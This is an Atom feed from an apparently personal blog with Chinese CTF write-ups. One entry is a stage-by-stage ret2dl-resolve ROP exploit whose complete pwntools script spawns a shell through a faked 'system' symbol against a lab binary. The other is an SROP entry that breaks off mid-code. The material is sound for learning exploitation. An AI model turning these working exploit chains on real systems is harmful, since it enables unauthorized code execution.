<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The lair of C0yo7e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-07T06:04:39.138Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>C0yo7e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>runtime_resolve</title>
    <link href="http://yoursite.com/2019/10/07/runtime-resolve/"/>
    <id>http://yoursite.com/2019/10/07/runtime-resolve/</id>
    <published>2019-10-07T04:23:05.000Z</published>
    <updated>2019-10-07T06:04:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p><p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p><a id="more"></a><p>对于此类题目：<br>关键点：</p><ol><li>.rel.plt表</li><li>.dynsym</li><li>.dynstr</li><li>从rel.plt里获得某个函数在.dynsym里的偏移</li><li>再从 .dynsym 里获得.dynstr里的偏移</li><li>在 .dynstr里找到对应的字符，将这个字符解析成函数</li></ol><p>然后贴一段我也没有理解的东西看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure><p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%871.png" alt></p><p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%872.png" alt></p><p>push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg）</p><p>然后跳到plt[0]  (0x8048380) 里，将linkmap  push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read  got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址)</p><p>关于四个关键函数的地址提取：<br>plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr</p><p>objdump -s -j .rel.plt babystack<br>objdump -d -j .plt babystack</p><p>（直接找ida来得更快一点）</p><p>readelf -S bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%873.png" alt></p><p>readelf -d bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%874.png" alt></p><p>JMPREL == .rel.plt<br>SYMTAB == .dynsym<br>STRREL == .dynstr<br>plt貌似只有-S里能找到</p><p>readelf -r bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%875.png" alt></p><p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%877.png" alt>    </p><p>Jmp –&gt; got表地址<br>Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）<br>Jmp –&gt; plt[0]的地址</p><p>再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中<br>GOT<a href="GOT+8">2</a>是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址</p><p>_dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write</p><p>漏洞利用方式：<br>1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可<br>2、控制index_arg的大小，使reloc的信息存入可控地址<br>3、伪造reloc内容，使sym在可控地址<br>4、伪造sym内容，是name在可控地址<br>5、伪造name为任意库函数，达到我们想要的效果</p><p>我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…）</p><p>Part1：<br>直接用write函数，查看最后输出效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(write_plt)</span><br><span class="line">payload1 += &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(1)</span><br><span class="line">payload1 += p32(base_stage+80)</span><br><span class="line">payload1 += p32(len(cmd))</span><br><span class="line">payload1 += &apos;A&apos; * (80 - len(payload1))</span><br><span class="line">payload1 += cmd</span><br><span class="line">payload1 += &apos;A&apos; * (100 - len(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>“/bin/sh“被打出来了</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%878.png" alt></p><p>Part 2<br>控制eip为pit[0]地址 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380  # objdump -d -j .plt bof</span><br><span class="line">index_offset = 0x20  # write&apos;s index</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%879.png" alt></p><p>Part 3<br>控制index_offset 指向fake_reloc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380 # objdump -d -j .plt bof</span><br><span class="line">rel_plt = 0x08048330 # objdump -s -j .rel.plt bof</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">r_info = 0x607 # write: Elf32_Rel-&gt;r_info</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8710.png" alt></p><p>Part 4<br>伪造fake_sym  指向st_name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = 0x4c</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8711.png" alt></p><p>Part 5<br>St_name指向 ‘write’，继续回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;write\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8712.png" alt></p><p>Part 6<br>把write改成system来getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>就可以成功getshell了！！！</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8713.png" alt></p><p>完整exp</p><figure class="highlight plain"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 2   system(&apos;/bin/sh&apos;)</span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += fake_reloc # stack_addr+28</span><br><span class="line">payload2 += &apos;A&apos; * align</span><br><span class="line">payload2 += fake_sym # stack_addr+36+align</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位&lt;/p&gt;
&lt;p&gt;控制程序执行 dl_resolve 函数&lt;br&gt;    给定 Link_map 以及 index 两个参数。&lt;br&gt;    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。&lt;br&gt;控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。&lt;br&gt;伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。&lt;br&gt;伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>srop</title>
    <link href="http://yoursite.com/2019/09/02/srop/"/>
    <id>http://yoursite.com/2019/09/02/srop/</id>
    <published>2019-09-02T15:51:52.000Z</published>
    <updated>2019-09-02T16:11:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p><p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p><a id="more"></a><p>这里懂了，大概的原理就懂了一点了（其实我很懵）<br>然后看到了我们的smallest</p><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%872.png" alt></p><p>整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。</p><p>首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步</p><p>那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0<br>所以第一步我们发送三个起始地址实现leak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) * 3</span><br></pre></td></tr></table></figure><p>在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用</p><p>然后我们知道<code>rax</code>这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制<code>rax</code>寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）<br>然后我们将<code>rax</code>寄存器设置成15（sigreturn的系统调用号），然后调用一个<code>syscall</code>，这个效果就和调用一个<code>sigreturn</code>是一样一样的（所以在额外我们再次写入了syscall）</p><p>所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 